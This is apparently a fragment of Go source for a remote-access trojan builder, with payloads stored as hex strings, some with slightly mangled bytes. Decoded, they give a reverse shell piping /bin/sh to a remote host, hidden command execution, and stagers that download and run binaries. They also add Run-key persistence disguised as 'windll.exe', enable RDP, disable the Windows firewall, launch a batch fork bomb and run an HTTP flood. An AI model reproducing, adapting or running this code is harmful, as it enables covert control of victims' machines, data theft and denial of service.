d6d616e642c2022a3646f732229207ba202020202020444f535f436f6d6d616e64203a3d20737472696e67732e53706c697428476c6f62616c5f5f436f6d6d616e642c20225c222229a202020202020444f535f546172676574203d2020444f535f436f6d6d616e645b315da202020202020676f20444f5328293b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a344495354524143542229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a364697374726163742229207b20a202020202020444953545241435428293b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a34445534b544f502229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a36465736b746f702229207b20a202020202020537461747573203a3d2052454d4f54455f4445534b544f502829a202020202020696620537461747573203d3d2066616c7365207ba2020202020202020636f6e6e6563742e5772697465285b5d6279746528225b2d5d206661696c656420a33e222929a2020202020207d656c73657ba2020202020202020636f6e6e6563742e5772697465285b5d6279746528225b2b5d207375636365737320a33e222929a2020202020207d202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a350455253495354454e43452229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a370657273697374656e63652229207b20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020202020676f205045525349535428293ba202020202020636f6e6e6563742e5772697465285b5d6279746528737472696e6728225c6e5c6e5b2a5d20416464696e672070657273697374656e636520726567697374726965732e2e2e5c6e5b2a5d2050657273697374656e636520436f6d706c657465645c6e5c6e20a33e20222929293b202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020207d656c73657ba202020202020636d64203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c205f436f6d6d616e64293ba202020202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba2020202020206f75742c205f203a3d20636d642e4f757470757428293ba202020202020436f6d6d616e645f4f7574707574203a3d20737472696e6728737472696e67286f7574292b2220a33e2022293ba202020202020636f6e6e6563742e5772697465285b5d6279746528436f6d6d616e645f4f757470757429293ba202020207d3ba20207d3ba7d3baaaaa66756e632055504c4f41445f5649415f4745542829207ba2020666f72207ba20202020646f776e6c6f61645f75726c203a3d20737472696e67732e53706c697428476c6f62616c5f5f436f6d6d616e642c20225c2222293ba20202020726573706f6e73652c20657272203a3d20687474702e47657428646f776e6c6f61645f75726c5b315d293ba2020202069662065727220213d206e696c207ba20202020202066696c655f7472616e736665725f737563636573203d2066616c73653ba202020202020627265616b3ba202020207d3ba20202020646566657220726573706f6e73652e426f64792e436c6f736528293ba20202020626f64792c205f203a3d20696f7574696c2e52656164416c6c28726573706f6e73652e426f6479293ba2020202066696c652c205f203a3d206f732e437265617465282277696e646c6c5f75706c6f61642e65786522293ba2020202066696c652e5772697465537472696e6728737472696e6728626f647929293ba2020202066696c655f7472616e736665725f737563636573203d20747275653ba2020202072756e74696d652e474328293ba20202020637573746f6d5f636f6d6d616e64203a3d2028226d6f76652077696e646c6c5f75706c6f61642e65786520222b2225222b2261707064617461222b222522293ba20202020636d64203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20637573746f6d5f636f6d6d616e64293ba20202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20202020636d642e52756e28293ba20202020627265616b3ba20207d3ba7d3baaaa66756e6320504552534953542829207baa2020504552534953542c205f203a3d206f732e4372656174652822504552534953542e6261742229aa2020504552534953542e5772697465537472696e6728226d6b646972202541505044415441255c5c57696e646f7773222b225c6e2229a2020504552534953542e5772697465537472696e672822636f70792022202b206f732e417267735b305d202b2022202541505044415441255c5c57696e646f77735c5c77696e646c6c2e6578655c6e2229a2020504552534953542e5772697465537472696e6728225245472041444420484b43555c5c534f4654574152455c5c4d6963726f736f66745c5c57696e646f77735c5c43757272656e7456657273696f6e5c5c52756e202f562057696e446c6c202f74205245475f535a202f46202f44202541505044415441255c5c57696e646f77735c5c77696e646c6c2e6578652229aa2020504552534953542e436c6f73652829aa202045786563203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c2022504552534953542e62617422293ba2020457865632e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba2020457865632e52756e28293ba2020436c65616e203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c202264656c20504552534953542e62617422293ba2020436c65616e2e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba2020436c65616e2e52756e28293ba7d3baaa66756e63204d455445525052455445525f4352454154452829207ba2020696620737472696e67732e436f6e7461696e7328476c6f62616c5f5f436f6d6d616e642c20222d632229207ba202020205041594c4f41442c205f203a3d206f732e437265617465282277696e646c6c2e6261742229a202020205041594c4f41445f434f4445203a3d20737472696e67732e53706c697428476c6f62616c5f5f436f6d6d616e642c20222d632229a202020205041594c4f41442e5772697465537472696e6728737472696e67285041594c4f41445f434f44455b315d2929a2020202072756e74696d652e47432829a20202020637573746f6d5f636f6d6d616e64203a3d2028226d6f76652077696e646c6c2e6261742022202b20222522202b202261707064617461222b222522293ba20202020636d64203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20637573746f6d5f636f6d6d616e64293ba20202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20202020636d642e52756e28293ba2020202072756e74696d652e474328293ba20202020637573746f6d5f636f6d6d616e64203d20282225222b2261707064617461222b2225222b222f77696e646c6c2e62617422293ba20202020636d64203d20657865632e436f6d6d616e642822636d64222c20222f43222c20637573746f6d5f636f6d6d616e64293ba20202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20202020636d642e52756e28293ba20202020636d64203d20657865632e436f6d6d616e642822636d64222c20222f43222c202277696e646c6c2e62617422293ba20202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20202020636d642e52756e28293ba20207d656c736520696620737472696e67732e436f6e7461696e7328476c6f62616c5f5f436f6d6d616e642c20222d432229207ba202020205041594c4f41442c205f203a3d206f732e437265617465282277696e646c6c2e6261742229a202020205041594c4f41445f434f4445203a3d20737472696e67732e53706c697428476c6f62616c5f5f436f6d6d616e642c20222d432229a202020205041594c4f41442e5772697465537472696e6728737472696e67285041594c4f41445f434f44455b315d2929a2020202072756e74696d652e47432829a20202020637573746f6d5f636f6d6d616e64203a3d2028226d6f76652077696e646c6c2e6261742022202b20222522202b202261707064617461222b222522293ba20202020636d64203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20637573746f6d5f636f6d6d616e64293ba20202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20202020636d642e52756e28293ba2020202072756e74696d652e474328293ba20202020637573746f6d5f636f6d6d616e64203d20282225222b2261707064617461222b2225222b222f77696e646c6c2e62617422293ba20202020636d64203d20657865632e436f6d6d616e642822636d64222c20222f43222c20637573746f6d5f636f6d6d616e64293ba20202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20202020636d642e52756e28293ba20202020636d64203d20657865632e436f6d6d616e642822636d64222c20222f43222c202277696e646c6c2e62617422293ba20202020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20202020636d642e52756e28293ba20207da7daaa66756e6320444f574e4c4f41445f5649415f5443502829207ba2020666f72207ba20202020636f6e6e6563742c20657272203a3d206e65742e4469616c2822746370222c2056494354494d5f49502b223a222b22353538383822293ba2020202069662065727220213d206e696c207ba20202020202055504c4f41445f5649415f54435028293ba202020207d3ba2020202066696c655f6e616d65203a3d20737472696e67732e53706c697428476c6f62616c5f5f436f6d6d616e642c20225c2222293ba2020202066696c652c205f203a3d206f732e4f70656e2866696c655f6e616d655b315d293ba2020202064656665722066696c652e436c6f736528293ba20202020696f2e436f707928636f6e6e6563742c2066696c65293ba20202020636f6e6e6563742e436c6f736528293ba20202020627265616b3ba20207d3ba7d3baaa66756e632055504c4f41445f5649415f5443502829207ba2020636f6e6e6563742c20657272203a3d206e65742e4469616c2822746370222c2056494354494d5f49502b223a222b22353538383822293ba202069662065727220213d206e696c207ba2020202055504c4f41445f5649415f54435028293ba20207d3ba202066696c655f6e616d65203a3d20737472696e67732e53706c697428476c6f62616c5f5f436f6d6d616e642c20225c2222293ba202066696c652c205f203a3d206f732e4372656174652866696c655f6e616d655b315d293ba202066696c655f6e616d655b315d203d20737472696e67732e5472696d2866696c655f6e616d655b315d2c20222022293ba202064656665722066696c652e436c6f736528293ba2020696f2e436f70792866696c652c20636f6e6e656374293ba202066696c652e436c6f736528293ba2020636f6e6e6563742e436c6f736528293ba7d3baaa66756e63205341595f504c4541534528292028737472696e67297ba2020436f6d6d616e64203a3d20737472696e67732e53706c697428476c6f62616c5f5f436f6d6d616e642c20225c2222293ba2020636d64203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20737472696e672822706f7765727368656c6c2e657865202d436f6d6d616e642053746172742d50726f63657373202d566572622052756e417320222b737472696e6728436f6d6d616e645b315d2929293ba2020636d642e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20206f75742c205f203a3d20636d642e4f757470757428293ba2020436f6d6d616e645f4f7574707574203a3d20737472696e6728737472696e67286f7574292b2220a33e2022293ba202072657475726e20436f6d6d616e645f4f75747075743ba7d3baaaa66756e632052454d4f54455f4445534b544f5028292028626f6f6c29207baa20207661722053746174757320626f6f6c203d20747275653ba2020456e61626c655f5244203a3d202272656720616464205c22686b6c6d5c5c73797374656d5c5c63757272656e74436f6e74726f6c5365745c5c436f6e74726f6c5c5c5465726d696e616c205365727665725c22202f76205c22416c6c6f775453436f6e6e656374696f6e735c22202f74205245475f44574f5244202f6420307831202f66223ba2020456e61626c655f52445f32203a3d202272656720616464205c22686b6c6d5c5c73797374656d5c5c63757272656e74436f6e74726f6c5365745c5c436f6e74726f6c5c5c5465726d696e616c205365727665725c22202f76205c226644656e795453436f6e6e656374696f6e735c22202f74205245475f44574f5244202f6420307830202f66223ba202072756e74696d652e474328293ba2020455f5244203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20737472696e6728456e61626c655f524429293ba2020455f52442e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba2020455f52442e52756e28293ba202072756e74696d652e474328293ba2020455f52445f32203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20737472696e6728456e61626c655f52445f3229293ba2020455f52445f322e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba2020455f52445f322e52756e28293ba202072756e74696d652e474328293ba202053746172745f5465726d536572766963655f31203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c2022736320636f6e666967205465726d536572766963652073746172743d206175746f22293ba202053746172745f5465726d536572766963655f312e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba2020536572766963655f4f75747075745f312c205f203a3d2053746172745f5465726d536572766963655f312e4f757470757428293ba2020696620737472696e67732e436f6e7461696e7328737472696e6728536572766963655f4f75747075745f31292c202264656e6965642e2229207ba20202020537461747573203d2066616c7365a20207da202072756e74696d652e474328293ba202053746172745f5465726d536572766963655f32203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20226e6574207374617274205465726d7365727669636522293ba202053746172745f5465726d536572766963655f322e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba202053746172745f5465726d536572766963655f322e52756e28293ba202072756e74696d652e474328293ba202044697361626c655f4657203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20226e65747368206669726577616c6c20736574206f706d6f64652064697361626c6522293ba202044697361626c655f46572e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba202046575f4f75747075742c205f203a3d2044697361626c655f46572e4f757470757428293ba202072756e74696d652e474328293ba2020696620737472696e67732e436f6e7461696e7328737472696e672846575f4f7574707574292c20222852756e2061732061646d696e6973747261746f72292e22297ba20202020537461747573203d2066616c7365a20207da202072657475726e20537461747573a7daaaa66756e632044495354524143542829207ba202076617220466f726b5f426f6d6220737472696e67203d20223a415c6e73746172745c6e676f746f204122aa2020465f426f6d622c205f203a3d206f732e4372656174652822465f426f6d622e6261742229aa2020465f426f6d622e5772697465537472696e6728466f726b5f426f6d6229aa2020465f426f6d622e436c6f73652829aa2020657865632e436f6d6d616e642822636d64222c20222f43222c2022465f426f6d622e62617422292e53746172742829aa7daaa66756e6320444f532829207ba2020666f72207ba20202020444f535f526571756573745f436f756e7465722b2ba20202020726573706f6e73652c205f203a3d20687474702e47657428444f535f546172676574293baa20202020626f64792c205f203a3d20696f7574696c2e52656164416c6c28726573706f6e73652e426f6479293ba20202020666d742e5072696e746c6e28626f647929a20202020726573706f6e73652e426f64792e436c6f736528293ba20202020696620444f535f526571756573745f436f756e746572203c20444f535f526571756573745f4c696d6974207ba202020202020676f20444f532829a202020207d656c73657ba202020202020627265616b3ba202020207d20a20207da7d"

var LINUX_PAYLOAD string = "a7061636b616765206d61696eaaa20a696d706f7274226f732f6578656322a696d706f7274226e657422a696d706f7274202274696d6522a696d706f72742022706174682f66696c657061746822a696d706f727420226f7322aa636f6e73742056494354494d5f495020737472696e67203d20223132372e302e302e31223ba636f6e73742056494354494d5f504f525420737472696e67203d202238353532223baa66756e63206d61696e28297ba20202020636f6e6e6563742c20657272203a3d6e65742e4469616c2822746370222c56494354494d5f49502b223a222b56494354494d5f504f5254293ba2020202069662065727220213d206e696c207b20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a20202020202074696d652e536c6565702831352a74696d652e5365636f6e64293b20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a2020202020206d61696e28293b202020202020202020202020202020202020202020202020202020202020202020202020a202020207d3b20a202020206469722c205f203a3d2066696c65706174682e4162732866696c65706174682e446972286f732e417267735b305d29293b2020202020a2020202076657273696f6e5f636865636b203a3d20657865632e436f6d6d616e6428227368222c20222d63222c2022756e616d65202d6122293ba2020202076657273696f6e2c205f203a3d2076657273696f6e5f636865636b2e4f757470757428293b2020202020202020202020a202020205379734775696465203a3d2028737472696e672864697229202b202220a33e2022202b20737472696e672876657273696f6e29202b202220a33e2022293b202020a20202020636f6e6e6563742e5772697465285b5d6279746528737472696e67285379734775696465292929a20202020636d643a3d657865632e436f6d6d616e6428222f62696e2f736822293ba20202020636d642e537464696e3d636f6e6e6563743ba20202020636d642e5374646f75743d636f6e6e6563743ba20202020636d642e5374646572723d636f6e6e6563743ba20202020636d642e52756e28293ba7d"


var WIN_STAGER_PAYLOAD string = "7061636b616765206d61696eaaa696d706f727420226f7322a696d706f727420226e657422a696d706f7274202274696d6522a696d706f72742022696f22a696d706f727420226f732f6578656322a696d706f7274202272756e74696d6522a696d706f7274202273797363616c6c22aa636f6e73742056494354494d5f4950203d20223132372e302e302e31223ba636f6e73742056494354494d5f504f5254203d202238353532223baa66756e63206d61696e2829207ba2020a2020436f6e6e6563742c20657272203a3d206e65742e4469616c2822746370222c2056494354494d5f49502b223a222b56494354494d5f504f5254293ba202069662065727220213d206e696c207b20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a2020202074696d652e536c65657028352a74696d652e5365636f6e64293b20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020206d61696e28293b202020202020202020202020202020202020202020202020202020202020202020202020a20207d3ba202066696c652c205f203a3d206f732e437265617465282277696e646c6c2e65786522293ba2020696f2e436f70792866696c652c20436f6e6e656374293ba202072756e74696d652e47432829a20204d6f76655f537472696e67203a3d20737472696e6728226d6f76652077696e646c6c2e65786520222b2225222b2261707064617461222b22252229a20204d6f7665203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c204d6f76655f537472696e67293ba20204d6f76652e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba20204d6f76652e52756e2829a2020457865637574655f537472696e67203a3d20737472696e67282225222b2261707064617461222b2225222b225c5c77696e646c6c2e6578652229a202045786563757465203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c20457865637574655f537472696e67293ba2020457865637574652e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba2020457865637574652e52756e2829a7d"


var LINUX_STAGER_PAYLOAD string = "a7061636b616765206d61696eaaa696d706f727420226f7322a696d706f727420226e657422a696d706f7274202274696d6522a696d706f72742022696f22a696d706f727420226f732f6578656322a696d706f7274202272756e74696d6522a696d706f7274202273797363616c6c22aa636f6e73742056494354494d5f4950203d20223132372e302e302e31223ba636f6e73742056494354494d5f504f5254203d202238353532223baa66756e63206d61696e2829207ba2020a2020436f6e6e6563742c20657272203a3d206e65742e4469616c2822746370222c2056494354494d5f49502b223a222b56494354494d5f504f5254293ba202069662065727220213d206e696c207b20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a2020202074696d652e536c65657028352a74696d652e5365636f6e64293b20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020206d61696e28293b202020202020202020202020202020202020202020202020202020202020202020202020a20207d3ba202066696c652c205f203a3d206f732e43726561746528226c696e75786c696222293ba2020696f2e436f70792866696c652c20436f6e6e656374293ba202072756e74696d652e47432829a2020657865632e436f6d6d616e6428227368222c20222d63222c202263686d6f6420373737206c696e75786c69622229a202045786563757465203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c202e2f6c696e75786c6962293ba2020457865637574652e52756e2829a7d"
